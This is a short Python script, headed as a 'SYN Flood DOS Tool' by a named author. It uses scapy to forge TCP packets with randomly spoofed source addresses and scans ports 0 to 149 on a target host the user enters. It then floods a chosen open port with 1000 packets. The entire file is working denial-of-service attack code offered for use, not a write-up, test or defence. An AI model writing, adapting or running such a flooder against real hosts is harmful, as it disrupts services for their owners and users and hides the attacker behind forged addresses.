# Davis Dinh
# SYN Flood DOS Tool

from scapy.all import *
import sys
import os
import random
import socket

def sourceSpoof():
	octet = []
	spoofIP = str(random.randint(1,254))
	for i in range(0,3):
		octet.append(random.randint(1,254)) #Try to avoid 0.0.0.0 and 255.255.255.255	
		spoofIP = spoofIP + "." + str(octet[i])
	
	return spoofIP

def construct(targetIP, dstPort):
	packet_h = IP()
	packet_h.dst = targetIP
	packet_h.src = sourceSpoof()

	tcp_h = TCP()
	tcp_h.sport = random.randint(1000,10000)
	tcp_h.dport = dstPort

	packet = packet_h/tcp_h
	return packet

def send_packet(packet):
	send(packet, verbose=0)

def portScan(targetIP):
	openPorts = []
	count = 0
	print("[*] Perfoming a quick port scan...")
	try:
		for port in range(0,150):
			client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			client.settimeout(0.5)
			if client.connect_ex((targetIP, port)) == 0:
				print("Port %d    OPEN" %port)
				openPorts.append(port)
				count = count + 1

			client.close()
	except KeyboardInterrupt:
		sys.exit()
	except socket.gaierror:
		sys.exit()
	except socket.error:
		sys.exit()
	
	print("[*] Port scan complete.")

def main():
	targetIP = raw_input("Target Host: ")
	portScan(targetIP)
	openDstPort = raw_input("Target Port: ")
	openDstPort = int(openDstPort)

	print("[*] Flooding in progress...")
	for i in range(0,1000):
		packet = construct(targetIP, openDstPort)
		send_packet(packet)
		print("Segment No. %d" %i)
	print("[*] Flood complete.")

main()
